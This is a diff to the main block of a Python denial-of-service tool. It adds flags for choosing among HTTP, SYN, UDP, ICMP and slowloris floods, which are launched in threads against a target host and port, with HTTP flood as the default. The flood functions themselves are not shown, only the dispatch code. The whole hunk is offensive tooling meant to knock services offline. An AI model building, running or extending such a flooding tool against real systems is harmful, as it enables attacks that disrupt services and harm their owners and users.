@@ -257,20 +257,33 @@ if __name__ == "__main__":
         "-pkgs", "--packages", help="Packages count", type=int, default=1000
     )
     parser.add_argument("-t", "--threads", help="Threads count", type=int, default=10)
+    parser.add_argument("--https", help="Use https flood", action="store_true")
+    parser.add_argument("--syn", help="Use SYN flood", action="store_true")
+    parser.add_argument("--udp", help="Use UDP flood", action="store_true")
+    parser.add_argument("--icmp", help="Use ICMP flood", action="store_true")
+    parser.add_argument("--slowloris", help="Use slowloris flood", action="store_true")
     args = parser.parse_args()
 
     p = urlparse(args.target)
     host = p.hostname
     port = args.port
 
-    attack_tasks = [
-        (run_http_flood, (args.target, round(args.packages / 5), args.threads)),
-        (run_syn_flood, (host, port, round(args.packages / 5), args.threads)),
-        (run_udp_flood, (host, port, round(args.packages / 5), args.threads)),
-        (run_icmp_flood, (host, round(args.packages / 5), args.threads)),
-        (run_slowloris, (host, port, round(args.packages / 5), args.threads)),
-    ]
+    attack_tasks = []
 
+    if args.syn:
+        attack_tasks.append((run_syn_flood, (host, port, args.packages, args.threads)))
+    if args.https:
+        attack_tasks.append((run_http_flood, (args.target, args.packages, args.threads)))
+    if args.udp:
+        attack_tasks.append((run_udp_flood, (host, port, args.packages, args.threads)))
+    if args.icmp:
+        attack_tasks.append((run_icmp_flood, (host, args.packages, args.threads)))
+    if args.slowloris:
+        attack_tasks.append((run_slowloris, (host, port, args.packages, args.threads)))
+
+    if len(attack_tasks) == 0:
+        attack_tasks.append((run_http_flood, (args.target, args.packages, args.threads)))
+        
     log.info("Starting all attack tasks using ThreadPoolExecutor...")
     with ThreadPoolExecutor(max_workers=len(attack_tasks)) as executor:
         futures = []
